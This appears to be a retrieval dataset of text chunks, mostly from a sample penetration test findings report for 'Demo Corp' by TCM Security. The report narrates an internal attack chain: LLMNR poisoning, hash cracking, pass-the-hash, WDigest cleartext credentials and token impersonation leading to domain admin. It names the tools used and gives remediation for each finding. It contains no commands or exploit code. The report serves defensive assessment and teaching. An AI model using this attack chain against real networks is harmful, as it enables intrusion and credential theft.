and vendors worldwide. To learn more about playing a part in securing payment card data globally, please visit: pcisecuritystandards.org. The intent of this document is to provide supplemental information. Information provided here does not 43",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 31
    }
  },
  {
    "text": "Security Assessment Findings Report Business Confidential Date: March 9th, 2021 Project: DC-001 Version 1.0 DEMO CORP BUSINESS CONFIDENTIAL Page 1 of 38\\nTable of Contents Table of Contents ....................................................................................................................................................... 2 Confidentiality Statement ......................................................................................................................................... 4 Disclaimer .................................................................................................................................................................. 4 Contact Information ................................................................................................................................................... 4 Assessment Overview ............................................................................................................................................... 5 Assessment Components ......................................................................................................................................... 5 Internal Penetration Test ........................................................................................................................ 5 Finding Severity Ratings ............................................................................................................................................ 6 Risk Factors ............................................................................................................................................................... 6 Likelihood ................................................................................................................................................ 6 Impact ...................................................................................................................................................... 6 Scope ......................................................................................................................................................................... 7 Scope Exclusions .................................................................................................................................... 7 Client Allowances ..................................................................................................................................... 7 Executive Summary ................................................................................................................................................... 8 Scoping and Time Limitations ................................................................................................................ 8 Testing Summary .................................................................................................................................... 8 Tester Notes and Recommendations .................................................................................................... 9 Key Strengths and Weaknesses ........................................................................................................... 10 Vulnerability Summary & Report Card .................................................................................................................... 11 Internal Penetration Test Findings ....................................................................................................... 11 Technical Findings ................................................................................................................................................... 13 Internal Penetration Test Findings ....................................................................................................... 13 Finding IPT-001: Insufficient LLMNR Configuration (Critical) ......................................................................... 13 Finding IPT-002: Security Misconfiguration – Local Admin Password Reuse (Critical) ................................ 14 Finding IPT-003: Security Misconfiguration – WDigest (Critical) ................................................................... 15 Finding IPT-004: Insufficient Hardening – Token Impersonation (Critical) ................................................... 16 Finding IPT-005: Insufficient Password Complexity (Critical) ......................................................................... 17 Finding IPT-006: Security Misconfiguration – IPv6 (Critical) .......................................................................... 18 Finding IPT-007: Insufficient Hardening – SMB Signing Disabled (Critical) .................................................. 19 Finding IPT-008: Insufficient Patch Management – Software (Critical) ........................................................ 20 Finding IPT-009: Insufficient Patch Management – Operating Systems (Critical) ........................................ 21 Finding IPT-010: Insufficient Patching – MS08-067 - ECLIPSEDWING/NETAPI (Critical) ............................. 22 Finding IPT-011: Insufficient Patching – MS12-020 – Remote Desktop RCE (Critical) ............................... 23 Finding IPT-012: Insufficient Patching – MS17-010 - EternalBlue (Critical) ................................................. 24 Finding IPT-013: Insufficient Patching – CVE-2019-0708 - BlueKeep (Critical) ........................................... 25 Finding IPT-014: Insufficient Privileged Account Management – Kerberoasting (High) .............................. 26\\nFinding IPT-015: Security Misconfiguration – GPP Credentials (High) .......................................................... 27 Finding IPT-016: Insufficient Authentication - VNC (High) .............................................................................. 28 Finding IPT-017: Default Credentials on Web Services (High) ....................................................................... 29 Finding IPT-018: Insufficient Hardening – Listable Directories (High) .......................................................... 30 Finding IPT-019: Unauthenticated SMB Share Access (Moderate) ............................................................... 31 Finding IPT-020: Insufficient Patch Management – SMBv1 (Moderate) ...................................................... 32 Finding IPT-021: IPMI Hash Disclosure (Moderate) ....................................................................................... 33 Finding IPT-022: Insufficient SNMP Community String Complexity (Moderate) ........................................... 34 Finding IPT-023: Insufficient Data in Transit Encryption - Telnet (Moderate) ............................................... 35 Finding IPT-024: Insufficient Terminal Services Configuration (Moderate) ................................................... 36 Finding IPT-025: Steps to Domain Admin (Informational) .............................................................................. 37 Additional Scans and Reports .............................................................................................................. 37\\nConfidentiality Statement This document is the exclusive property of Demo Corp and TCM Security (TCMS). This document contains proprietary and confidential information. Duplication, redistribution, or use, in whole or in part, in any form, requires consent of both Demo Corp and TCMS. Demo Corp may share this document with auditors under non-disclosure agreements to demonstrate penetration test requirement compliance. Disclaimer A penetration test is considered a snapshot in time. The findings and recommendations reflect the information gathered during the assessment and not any changes or modifications made outside of that period. Time-limited engagements do not allow for a full evaluation of all security controls. TCMS prioritized the assessment to identify the weakest security controls an attacker would",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 0
    }
  },
  {
    "text": "in time. The findings and recommendations reflect the information gathered during the assessment and not any changes or modifications made outside of that period. Time-limited engagements do not allow for a full evaluation of all security controls. TCMS prioritized the assessment to identify the weakest security controls an attacker would exploit. TCMS recommends conducting similar assessments on an annual basis by internal or third-party assessors to ensure the continued success of the controls. Contact Information Name Title Contact Information Demo Corp Global Information Security John Smith Email: jsmith@democorp.com Manager TCM Security Heath Adams Lead Penetration Tester Email: heath@tcm-sec.com Demo Corp BUSINESS CONFIDENTIAL Page 4 of 38\\nAssessment Overview From February 22nd, 2021 to March 5th, 2021, Demo Corp engaged TCMS to evaluate the security posture of its infrastructure compared to current industry best practices that included an internal network penetration test. All testing performed is based on the NIST SP 800-115 Technical Guide to Information Security Testing and Assessment, OWASP Testing Guide (v4), and customized testing frameworks. Phases of penetration testing activities include the following: • Planning – Customer goals are gathered and rules of engagement obtained. • Discovery – Perform scanning and enumeration to identify potential vulnerabilities, weak areas, and exploits. • Attack – Confirm potential vulnerabilities through exploitation and perform additional discovery upon new access. • Reporting – Document all found vulnerabilities and exploits, failed attempts, and company strengths and weaknesses. Assessment Components Internal Penetration Test An internal penetration test emulates the role of an attacker from inside the network. An engineer will scan the network to identify potential host vulnerabilities and perform common and advanced internal network attacks, such as: LLMNR/NBT-NS poisoning and other man- in-the-middle attacks, token impersonation, kerberoasting, pass-the-hash, golden ticket, and more. The engineer will seek to gain access to hosts through lateral movement, compromise domain user and admin accounts, and exfiltrate sensitive data. Demo Corp BUSINESS CONFIDENTIAL Page 5 of 38\\nFinding Severity Ratings The following table defines levels of severity and corresponding CVSS score range that are used throughout the document to assess vulnerability and risk impact. CVSS V3 Severity Definition Score Range Exploitation is straightforward and usually results in system-level Critical 9.0-10.0 compromise. It is advised to form a plan of action and patch immediately. Exploitation is more difficult but could cause elevated privileges and High 7.0-8.9 potentially a loss of data or downtime. It is advised to form a plan of action and patch as soon as possible. Vulnerabilities exist but are not exploitable or require extra steps such Moderate 4.0-6.9 as social engineering. It is advised to form a plan of action and patch after high-priority issues have been resolved. Vulnerabilities are non-exploitable but would reduce an organization’s Low 0.1-3.9 attack surface. It is advised to form a plan of action and patch during the next maintenance window. No vulnerability exists. Additional information is provided regarding Informational N/A items noticed during testing, strong controls, and additional documentation. Risk Factors Risk is measured by two factors: Likelihood and Impact: Likelihood Likelihood measures",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 1
    }
  },
  {
    "text": "surface. It is advised to form a plan of action and patch during the next maintenance window. No vulnerability exists. Additional information is provided regarding Informational N/A items noticed during testing, strong controls, and additional documentation. Risk Factors Risk is measured by two factors: Likelihood and Impact: Likelihood Likelihood measures the potential of a vulnerability being exploited. Ratings are given based on the difficulty of the attack, the available tools, attacker skill level, and client environment. Impact Impact measures the potential vulnerability’s effect on operations, including confidentiality, integrity, and availability of client systems and/or data, reputational harm, and financial loss. Demo Corp BUSINESS CONFIDENTIAL Page 6 of 38\\nScope Assessment Details Internal Penetration Test 10.x.x.x/8 Scope Exclusions Per client request, TCMS did not perform any of the following attacks during testing: • Denial of Service (DoS) • Phishing/Social Engineering All other attacks not specified above were permitted by Demo Corp. Client Allowances Demo Corp provided TCMS the following allowances: • Internal access to network via dropbox and port allowances Demo Corp BUSINESS CONFIDENTIAL Page 7 of 38\\nExecutive Summary TCMS evaluated Demo Corp’s internal security posture through penetration testing from February 22nd, 2021 to March 5th, 2021. The following sections provide a high-level overview of vulnerabilities discovered, successful and unsuccessful attempts, and strengths and weaknesses. Scoping and Time Limitations Scoping during the engagement did not permit denial of service or social engineering across all testing components. Time limitations were in place for testing. Internal network penetration testing was permitted for ten (10) business days. Testing Summary The network assessment evaluated Demo Corp’s internal network security posture. From an internal perspective, the TCMS team performed vulnerability scanning against all IPs provided by Demo Corp to evaluate the overall patching health of the network. The team also performed common Active Directory based attacks, such as Link-Local Multicast Name Resolution (LLMNR) Poisoning, SMB relaying, IPv6 man-in-the-middle relaying, and Kerberoasting. Beyond vulnerability scanning and Active Directory attacks, the TCMS evaluated other potential risks, such as open file shares, default credentials on servers/devices, and sensitive information disclosure to gain a complete picture of the network’s security posture. The TCMS team discovered that LLMNR was enabled in the network (Finding IPT-001), which permitted the interception of user hashes via LLMNR poisoning. These hashes were taken offline and cracked via dictionary attacks, which signals a weak password policy (Finding IPT-005). Utilizing the cracked passwords, the TCMS team gained access to several machines within the network, which indicates overly permissive user accounts. With machine access, and the use of older operating systems in the network (Finding IPT-009), the team was able to leverage WDigest (Finding IPT-003) to recover cleartext credentials to accounts. The team was also able to dump local account hashes on each machine accessed. The TCMS team discovered that the local account hashes were being re-used across devices (Finding IPT-002), which lead to additional machine access through pass-the-hash attacks. Ultimately, the TCMS team was able to leverage accounts captured through WDigest and hash dumps to move laterally throughout",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 2
    }
  },
  {
    "text": "account hashes on each machine accessed. The TCMS team discovered that the local account hashes were being re-used across devices (Finding IPT-002), which lead to additional machine access through pass-the-hash attacks. Ultimately, the TCMS team was able to leverage accounts captured through WDigest and hash dumps to move laterally throughout the network until landing on a machine that had a Domain Administrator credential in cleartext via WDigest. The testing team was able to use this credential to log into the domain controller and compromise the entire domain. For a full walkthrough of the path to Domain Admin, please see Finding IPT-025. Demo Corp BUSINESS CONFIDENTIAL Page 8 of 38\\nIn addition to the compromise listed above, the TCMS team found that users could be impersonated through delegation attacks (Finding IPT-004), SMB relay attacks were possible due to SMB signing being disabled (Finding IPT-007), and IPv6 traffic was not restricted, which could lead to LDAPS relaying and domain compromise (Finding IPT-006). The remainder of critical findings relate to patch management as devices with critical out-of-date software (Finding IPT-008), operating systems (Finding IPT-009), and Microsoft RCE vulnerabilities (Findings IPT-010, IPT-011, IPT-012, IPT-013), were found to be present within the network. The remainder of the findings were high, moderate, low, or informational. For further information on findings, please review the Technical Findings section. Tester Notes and Recommendations Testing results of the Demo Corp network are indicative of an organization undergoing its first penetration test, which is the case here. Many of the findings discovered are vulnerabilities within Active Directory that come enabled by default, such as LLMNR, IPv6, and Kerberoasting. During testing, two constants stood out: a weak password policy and weak patching. The weak password policy led to the initial compromise of accounts and is usually one of the first footholds an attacker attempts to use in a network. The presence of a weak password policy is backed up by the evidence of our testing team cracking over 2,200 user account passwords, including a majority of the Domain Administrator accounts, through basic dictionary attacks. We recommended that Demo Corp re-evaluates their current password policy and considers a policy of 15 characters or more for their regular user accounts and 30 characters or more for their Domain Administrator accounts. We also recommend that Demo Corp explore password blacklisting and will be supplying a list of cracked user passwords for the team to evaluate. Finally, a Privilege Access Management solution should be considered. Weak patching and dated operating systems led to the compromise of dozens of machines within the network. We believe the number of compromised machines would have been significantly larger, however the TCMS and Demo Corp teams agreed it was not necessary to attempt to exploit any remote code execution (RCE) based vulnerabilities, such as MS17-010 (Finding IPT-012), as the domain controller had already been compromised and the teams did not want to risk any denial of service through failed attacks. We recommend that the Demo Corp team review the patching recommendations made",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 3
    }
  },
  {
    "text": "attempt to exploit any remote code execution (RCE) based vulnerabilities, such as MS17-010 (Finding IPT-012), as the domain controller had already been compromised and the teams did not want to risk any denial of service through failed attacks. We recommend that the Demo Corp team review the patching recommendations made in the Technical Findings section of the report along with reviewing the provided Nessus scans for a full overview of items to be patched. We also recommend that Demo Corp improve their patch management policies and procedures to help prevent potential attacks within their network. Demo Corp BUSINESS CONFIDENTIAL Page 9 of 38\\nOn a positive note, our testing team triggered several alerts during the engagement. The Demo Corp Security Operations team discovered our vulnerability scanning and was alerted when we attempted to use noisy attacks on a compromised machine. While not all attacks were discovered during testing, these alerts are a positive start. Additional guidance on alerting and detection has been provided for findings, when necessary, in the Technical Findings section. Overall, the Demo Corp network performed as expected for a first-time penetration test. We recommend that the Demo Corp team thoroughly review the recommendations made in this report, patch the findings, and re-test annually to improve their overall internal security posture. Key Strengths and Weaknesses The following identifies the key strengths identified during the assessment: 1. Observed some scanning of common enumeration tools (Nessus) 2. Mimikatz detected on some machines 3. Service accounts were not running as domain administrators 4. Demo Corp local administrator account password was unique to each device The following identifies the key weaknesses identified during the assessment: 1. Password policy found to be insufficient 2. Critically out-of-date operating systems and weak patching exist within the network 3. Passwords were observed in cleartext due to WDigest 4. LLMNR is enabled within the network 5. SMB signing is disabled on all non-server devices in the work 6. IPv6 is improperly managed within the network 7. User accounts can be impersonated through token delegation 8. Local admin accounts had password re-use and were overly permissive 9. Default credentials were discovered on critical infrastructure, such as iDRACs 10. Unauthenticated share access was permitted 11. User accounts were found to be running as service accounts 12. Service accounts utilized weak passwords 13. Domain administrator utilized weak passwords Demo Corp BUSINESS CONFIDENTIAL Page 10 of 38\\nVulnerability Summary & Report Card The following tables illustrate the vulnerabilities found by impact and recommended remediations: Internal Penetration Test Findings 13 5 6 0 1 Critical High Moderate Low Informational Finding Severity Recommendation Internal Penetration Test IPT-001: Insufficient LLMNR Critical Disable multicast name resolution via Configuration GPO. IPT-002: Security Misconfiguration – Critical Utilize unique local admin passwords Local Admin Password Reuse and limit local admin users via least privilege. IPT-003: Security Misconfiguration – Critical Disable WDigest via GPO. Wdigest IPT-004: Insufficient Hardening – Critical Restrict token delegation. Token Impersonation IPT-005: Insufficient Password Critical Implement CIS Benchmark password Complexity requirements / PAM solution. IPT-006: Security Misconfiguration",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 4
    }
  },
  {
    "text": "admin passwords Local Admin Password Reuse and limit local admin users via least privilege. IPT-003: Security Misconfiguration – Critical Disable WDigest via GPO. Wdigest IPT-004: Insufficient Hardening – Critical Restrict token delegation. Token Impersonation IPT-005: Insufficient Password Critical Implement CIS Benchmark password Complexity requirements / PAM solution. IPT-006: Security Misconfiguration – Critical Restrict DHCPv6 traffic and incoming IPv6 router advertisements in Windows Firewall via GPO. IPT-007: Insufficient Hardening – Critical Enable SMB signing on all Demo Corp SMB Signing Disabled domain computers. IPT-008: Insufficient Patch Critical Update to the latest software version. Management – Software IPT-009: Insufficient Patch Critical Update Operating Systems to the Management – Operating Systems latest version. IPT-010: Insufficient Patching – Critical Apply the appropriate Microsoft MS08-067 - ECLIPSEDWING/NETAPI patches to remediate the issue. IPT-011: Insufficient Patching – Critical Apply the appropriate Microsoft MS12-020 – Remote Desktop RCE patches to remediate the issue. IPT-012: Insufficient Patching – Critical Apply the appropriate Microsoft MS17-010 - EternalBlue patches to remediate the issue. IPT-013: Insufficient Patching – CVE- Critical Apply the appropriate Microsoft 2019-0708 - BlueKeep patches to remediate the issue. Demo Corp BUSINESS CONFIDENTIAL Page 11 of 38\\nFinding Severity Recommendation IPT-014: Insufficient Privileged High Use Group Managed Service Account Management – Accounts (GMSA) for privileged Kerberoasting services. IPT-015: Security Misconfiguration – High Apply vendor patching. Do not use GPP Credentials GPP cpasswords. IPT-016: Insufficient Authentication - High Enable authentication on the VNC VNC Server. IPT-017: Default Credentials on Web High Change default credentials or disable Services unused accounts. IPT-018: Insufficient Hardening – High Restrict access and conduct web app Listable Directories assessment. IPT-019: Unauthenticated SMB Share Moderate Disable SMB share or require Access authentication. IPT-020: Insufficient Patch Moderate Upgrade to SMBv3 and apply latest Management – SMBv1 patching. IPT-021: IPMI Hash Disclosure Moderate Disable IPMI over LAN if it is not needed. IPT-022: Insufficient SNMP Moderate Disabled SNMP if not required. Community String Complexity IPT-023: Insufficient Data in Transit Moderate Migrate to TLS protected protocols. Encryption - Telnet IPT-024: Insufficient Terminal Moderate Enable Network Level Authentication Services Configuration (NLA) on the remote RDP server. IPT-025: Steps to Domain Admin Informational Review action and remediation steps. Demo Corp BUSINESS CONFIDENTIAL Page 12 of 38\\nTechnical Findings Internal Penetration Test Findings Finding IPT-001: Insufficient LLMNR Configuration (Critical) Description: Demo Corp allows multicast name resolution on their end-user networks. TCMS captured 20 user account hashes by poisoning LLMNR traffic and cracked 2 with commodity cracking software. The cracked accounts were used to leverage further access that led to the compromise of the Domain Controller. Risk: Likelihood: High – This attack is effective in environments allowing multicast name resolution. Impact: Very High – LLMNR poisoning permits attackers to capture password hashes to either crack offline or relay in real-time and pivot laterally in the environment. System: All Tools Used: Responder, Hashcat References: Stern Security - Local Network Attacks: LLMNR and NBT-NS Poisoning NIST SP800-53 r4 IA-3 - Device Identification and Authentication NIST SP800-53 r4 CM-6(1) - Configuration Settings Evidence Figure 1: Captured hash of",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 5
    }
  },
  {
    "text": "offline or relay in real-time and pivot laterally in the environment. System: All Tools Used: Responder, Hashcat References: Stern Security - Local Network Attacks: LLMNR and NBT-NS Poisoning NIST SP800-53 r4 IA-3 - Device Identification and Authentication NIST SP800-53 r4 CM-6(1) - Configuration Settings Evidence Figure 1: Captured hash of “production” Figure 2: Cracked hash of “production” Remediation Disable multicast name resolution via GPO. For full mitigation and detection guidance, please reference the MITRE guidance here. The cracked hashes demonstrate a deficient password complexity policy. If multicast name resolution is required, Network Access Control (NAC) combined with application whitelisting can limit these attacks. Demo Corp BUSINESS CONFIDENTIAL Page 13 of 38\\nFinding IPT-002: Security Misconfiguration – Local Admin Password Reuse (Critical) Description: TCMS utilized local administrator hashes to gain access to other machines in the network via a ‘pass-the-hash’ attack. The local administrator hashes were obtained via machine access provided by the cracked account in IPT-001. Pass-the-hash attacks do not require knowing the account password to successfully log into a machine. Thus, reusing the same local admin password (and therefore the same hash) on multiple machines will permit system access to those computers. TCMS leveraged this attack to gain access to ~50 machines within the main office. This led to further account access and the eventual compromise of the domain controller. Risk: Likelihood: High – This attack is effective in large networks with local admin password reuse. Impact: Very High – Pass-the-hash permits an attacker to move laterally and vertically throughout the network. System: All Tools Used: Impacket, Crackmapexec References: https://capec.mitre.org/data/definitions/644.html https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security/ Evidence Figure 3: Local admin hash used to gain access to machine Remediation Utilize unique local admin passwords. Limit local admin users via least privilege. Consider implementing a PAM solution. For full mitigation and detection guidance, please reference the MITRE guidance here. Demo Corp BUSINESS CONFIDENTIAL Page 14 of 38\\nFinding IPT-003: Security Misconfiguration – WDigest (Critical) Description: Demo Corp permitted out-of-date operating systems within their network, including Windows 7, 8, Server 2008, and Server 2012. These operating systems, by default, permit WDigest, which stores all current logged-in user’s passwords in clear-text. TCMS leveraged machine access gained in IPT-001 and IPT-002 to move laterally throughout the network until uncovering a machine with Domain Admin credentials stored in WDigest. Risk: Likelihood: Moderate – This attack is effective in networks with older operating systems. Impact: Very High – WDigests credentials are stored in clear text, which can permit the theft of sensitive accounts, such as Domain Administrators. System: All systems older than Windows 10 and Server 2016 Tools Used: Metasploit, Kiwi References: https://stealthbits.com/blog/wdigest-clear-text-passwords-stealing-more-than- a-hash/ Evidence Figure 4: Cleartext passwords of Domain Administrators Remediation Disable WDigest via GPO. For full mitigation and detection guidance, please reference the guidance here. Demo Corp BUSINESS CONFIDENTIAL Page 15 of 38\\nFinding IPT-004: Insufficient Hardening – Token Impersonation (Critical) Description: TCMS impersonated the token of “supcb” to obtain Domain Administrator privileges. Risk: Likelihood: High – The penetration tester viewed and impersonated tokens with the use of open-source tools.",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 6
    }
  },
  {
    "text": "guidance, please reference the guidance here. Demo Corp BUSINESS CONFIDENTIAL Page 15 of 38\\nFinding IPT-004: Insufficient Hardening – Token Impersonation (Critical) Description: TCMS impersonated the token of “supcb” to obtain Domain Administrator privileges. Risk: Likelihood: High – The penetration tester viewed and impersonated tokens with the use of open-source tools. Impact: Very High - If exploited, an attacker gains domain administrator access. System: All Tools Used: Metasploit, Incognito References: NIST SP800-53 r4 CM-7 - Least Functionality NIST SP800-53 r4 AC-6 - Least Privilege https://docs.microsoft.com/en-us/windows-server/identity/ad- ds/manage/how-to-configure- protected-accounts Evidence Figure 5: Impersonation of “sup” Figure 6: Shell access as Domain Admin “sup” Remediation Restrict token delegation. For full mitigation and detection guidance, please reference the MITRE guidance here. Demo Corp BUSINESS CONFIDENTIAL Page 16 of 38\\nFinding IPT-005: Insufficient Password Complexity (Critical) Description: TCMS dumped hashes from the domain controller and proceeded to attempt common password guessing attacks against all users. TCMS cracked 2,226 passwords using basic password list guessing attacks and low effort brute forcing attacks. 17 cracked accounts had domain administrator rights. Risk: Likelihood: High - Simple passwords are susceptible to password cracking attacks. Encryption provides some protection, but dictionary attacks base on common word lists often crack weak passwords. Impact: Very High - Domain admin accounts with weak passwords could lead to an adversary critically impacting Demo Corp ability to operate. System: All Tools Used: Manual Review References: NIST SP800-53 IA-5(1) - Authenticator Management https://www.cisecurity.org/white-papers/cis-password-policy-guide/ Evidence Figure 7: Excerpt of cracked domain hashes Remediation Implement CIS Benchmark password requirements / PAM solution. TCMS recommends that Demo Corp enforce industry best practices around password complexity and management. A password filter to prevent users from using common and easily guessable passwords is also recommended. Additionally, TCMS recommends that Demo Corp enforce stricter password requirements for Domain Administrator and other sensitive accounts. Demo Corp BUSINESS CONFIDENTIAL Page 17 of 38\\nFinding IPT-006: Security Misconfiguration – IPv6 (Critical) Description: Through IPv6 DNS poisoning, the TCMS team was able to successfully relay credentials to the Demo Corp domain controller. Risk: Likelihood: High – IPv6 is enabled by default on Windows networks. The tools and techniques required to perform this task are trivial. Impact: Very High - If exploited, an attacker can gain domain administrator access. System: All Tools Used: Mitm6, Impacket References: https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via- ipv6/ Evidence Figure 8: Successfully relayed LDAP credentials via mitm6 Remediation 1. IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments. If you do not use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of Allow prevents the attack from working: a. (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In) b. (Inbound) Core Networking - Router Advertisement (ICMPv6-In) c. (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6- Out) 2. If WPAD is not in use internally, disable it via Group Policy",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 7
    }
  },
  {
    "text": "Allow prevents the attack from working: a. (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In) b. (Inbound) Core Networking - Router Advertisement (ICMPv6-In) c. (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6- Out) 2. If WPAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc service. 3. Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding. Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation. Demo Corp BUSINESS CONFIDENTIAL Page 18 of 38\\nFinding IPT-007: Insufficient Hardening – SMB Signing Disabled (Critical) Description: Demo Corp failed to implement SMB signing on multiple devices. The absence of SMB signing could lead to SMB relay attacks, yielding system-level shells without requiring a user password. Risk: Likelihood: High – Relaying password hashes is a basic technique not requiring offline cracking. Impact: High – If exploited, an adversary gains code execution, leading to lateral movement across the network. System: Identified 709 machines, please see the below file for listing. [file removed] Tools Used: Nessus, Nmap, MultiRelay, Responder References: CIS Microsoft Windows Server 2012 R2 v2.2.0 (Page 180) https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py Evidence Figure 9: Successful SMB relay Remediation Enable SMB signing on all Demo Corp domain computers. Alternatively, as SMB signing can cause performance issues, disabling NTLM authentication, enforcing account tiering, and limiting local admin users can effectively help mitigate attacks. For full mitigation and detection guidance, please reference the MITRE guidance here. Demo Corp BUSINESS CONFIDENTIAL Page 19 of 38\\nFinding IPT-008: Insufficient Patch Management – Software (Critical) Description: Demo Corp permitted various deprecated software in their network. This includes: • Apache version < 2.4.46 • Apache Tomcat version < 7.0.100, 8.5.51, 9.0.31 • Cisoco AireOS version 8.5.151.10 • CodeMeter version 3.05 (5.21.1478.500) • Dropbear SSH Server version 2015.68 • Dell iDRAC7 version 2.63.60.62.01 • Dell iDRAC8 version 2.63.60.61.06 • Dell iDRAC9 version 3.36.36.36.21 • ESXi version 5.5 • ESXi version 6.5 build 15256549 • Flexera FlexNet Publisher version 11.16.0 • IIS version 7.5 • ISC BIND version 9.6.2-P2 • Microsoft DNS Server version 6.1.7601.24261 • Microsoft SQL Server version 11.0.6594.0 • Netatalk OpenSession version < 3.1.12 • PHP version < 7.3.11 • Rockwell Automation RSLinx Classic Above lists all critical and high-rated deprecated software, the majority of which permit serious vulnerabilities, such as remote code execution. For a full patching list, please review the provided Nessus scan documentation. Risk: Likelihood: High – An attacker can discover these vulnerabilities with basic tools. Impact: Very High – If exploited, an attacker could possibly gain full remote code execution on or deny service to a system. Tools Used: Nessus References: NIST SP800-53 r4 MA-6 – Timely Maintenance NIST SP800-53 r4 SI-2 – Flaw Remediation Remediation Update to the latest software version. For a full list of vulnerable systems, versions, and patching requirements, please see the below document. [file removed] Demo Corp",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 8
    }
  },
  {
    "text": "deny service to a system. Tools Used: Nessus References: NIST SP800-53 r4 MA-6 – Timely Maintenance NIST SP800-53 r4 SI-2 – Flaw Remediation Remediation Update to the latest software version. For a full list of vulnerable systems, versions, and patching requirements, please see the below document. [file removed] Demo Corp BUSINESS CONFIDENTIAL Page 20 of 38\\nFinding IPT-009: Insufficient Patch Management – Operating Systems (Critical) Description: Demo Corp permitted various deprecated software in their network. This includes: • Windows Server 2003 (end of life on July 14, 2015) • Windows Server 2008 R2 (end of life on January 14, 2020) • Windows XP (end of life on April 8, 2014) • Windows 7 (end of life on January 14, 2020) • Ubuntu 11 (end of life on May 9, 2013) • FreeBSD 11.0 (end of life on October, 2016) End of life systems are susceptible to a multitude of vulnerabilities. TCMS did not attempt any attacks against these servers due to the risk of a denial of service, which is out of scope. Risk: Likelihood: High – An attacker can discover these vulnerabilities with basic tools. Impact: High – If exploited, an attacker could possibly gain full remote code execution on or deny service to a system. System: Identified 139 machines, please see the below file for listing. [file removed] Tools Used: Nessus References: NIST SP800-53 r4 MA-6 – Timely Maintenance NIST SP800-53 r4 SI-2 – Flaw Remediation Remediation Update Operating Systems to the latest version. Demo Corp BUSINESS CONFIDENTIAL Page 21 of 38\\nFinding IPT-010: Insufficient Patching – MS08-067 - ECLIPSEDWING/NETAPI (Critical) Description: Demo Corp permitted an unpatched system on the internal network that is vulnerable to MS08-067. TCM Security confirmed that the vulnerability likely exists but did not attempt the exploit to prevent any denial of service. Risk: Likelihood: High – Considered one of the most exploited vulnerabilities in Microsoft Windows as it ships natively with Windows XP. Impact: Very High – If exploited, an attacker gains code execution as the system user. An adversary will require additional techniques to obtain domain administrator access. System: 10.x.x.x Tools Used: Nessus, Nmap References: NIST SP800-53 r4 MA-6 – Timely Maintenance NIST SP800-53 r4 SI-2 – Flaw Remediation Evidence Figure 10: Unpatched MS08-067 Remediation Apply the appropriate Microsoft patches to remediate the issue. More information on patching MS08-067 can be found here: https://docs.microsoft.com/en-us/security- updates/SecurityBulletins/2008/ms08-067 Demo Corp BUSINESS CONFIDENTIAL Page 22 of 38\\nFinding IPT-011: Insufficient Patching – MS12-020 – Remote Desktop RCE (Critical) Description: Demo Corp permitted an unpatched system on the internal network that is vulnerable to MS12-020. TCM Security confirmed that the vulnerability likely exists but did not attempt the exploit to prevent any denial of service. Risk: Likelihood: High – The vulnerability is easily discoverable and exploitable with open-source tools. Impact: Very High – If exploited, an attacker gains code execution as the system user. An adversary will require additional techniques to obtain domain administrator access. System: 10.x.x.x Tools Used: Nessus, Nmap References: NIST SP800-53 r4 MA-6 – Timely Maintenance NIST",
    "metadata": {
      "doc_id": "TCMS - Demo Corp - Findings Report - Example 2",
      "chunk_id": 9
    }
  },
  {
    "text": "vulnerability is easily discoverable and exploitable with open-source tools. Impact: Very High – If exploited, an attacker gains code execution as the system user. An adversary will require additional techniques to obtain domain administrator access. System: 10.x.x.x Tools Used: Nessus, Nmap References: NIST SP800-53 r4 MA-6 – Timely Maintenance NIST SP800-53 r4 SI-2 – Flaw Remediation Evidence Figure 11: Unpatched MS12-020 Remediation Apply the appropriate Microsoft patches to remediate the issue. More information on patching MS12-020 can be found here: https://docs.microsoft.com/en-us/security- updates/securitybulletins/2012/ms12-020 Demo Corp BUSINESS CONFIDENTIAL Page 23 of 38\\nFinding IPT-012: Insufficient Patching – MS17-010 - EternalBlue (Critical) Description: Demo Corp permitted several unpatched systems on the internal network that are vulnerable to MS17-010 (EternalBlue). TCM Security confirmed that the vulnerability likely exists but did not attempt the exploit to prevent any denial of service. Risk: Likelihood: High – Malicious actors have used SMB exploitations like EternalBlue in recent breaches. Impact: Very High – If exploited, an attacker gains code execution as the system user. An adversary will require additional techniques to obtain domain administrator access. System: 10.x.x.x Tools Used: Nessus, Metasploit, AutoBlue References: NIST SP800-53 r4 MA-6 – Timely Maintenance NIST SP800-53 r4 SI-2 – Flaw Remediation Evidence Figure 12: Unpatched MS17-010 Remediation Apply the appropriate Microsoft patches to remediate the issue. More information on patching MS17-010 can be found here: https://docs.microsoft.com/en-us/security- updates/securitybulletins/2017/ms17-010 Demo Corp BUSINESS CONFIDENTIAL Page 24 of 38\\nFinding IPT-013: Insufficient Patching – CVE-2019-0708 - BlueKeep (Critical) Description: Demo Corp permitted several unpatched systems on the internal network that are vulnerable to CVE-2019-0708 (BlueKeep). TCM Security confirmed that the vulnerability likely 